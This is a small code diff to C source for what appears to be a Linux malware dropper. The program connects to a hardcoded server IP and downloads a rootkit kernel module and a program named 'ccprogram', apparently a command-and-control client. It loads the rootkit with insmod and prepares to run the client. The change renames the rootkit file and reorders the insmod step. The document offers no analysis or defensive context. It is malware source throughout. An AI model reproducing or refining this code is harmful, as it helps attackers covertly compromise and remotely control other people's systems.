@@ -16,7 +16,7 @@
 #define BUFFER_SIZE 4096
 #define SERVER_ADDR "104.194.123.106"
 #define CMD_RESULT "cmdoutput.txttmp"
-char* ROOTKIT = "hidefile.ko";   
+char* ROOTKIT = "myrootkit.ko";   
 char* CCPROGRAM = "ccprogram";  
 struct utsname OS_info;
 char buf[BUFFER_SIZE];
@@ -44,12 +44,13 @@ int main()
     rv = obtain(ROOTKIT);
     close(sock_fd);
     
-    char *rktargs[] = {"insmod", ROOTKIT, NULL};
-    if(rv == 0) execcmd(rktargs);
-    
     rv = opensocket();
     rv = obtain(CCPROGRAM);
     close(sock_fd);
+    
+    char *rktargs[] = {"insmod", ROOTKIT, NULL};
+    if(rv == 0) execcmd(rktargs);
+    
     memcpy(buf, "./", 2);
     memcpy(buf, CCPROGRAM, strlen(CCPROGRAM));
     char *ccargs[] = {buf, NULL};
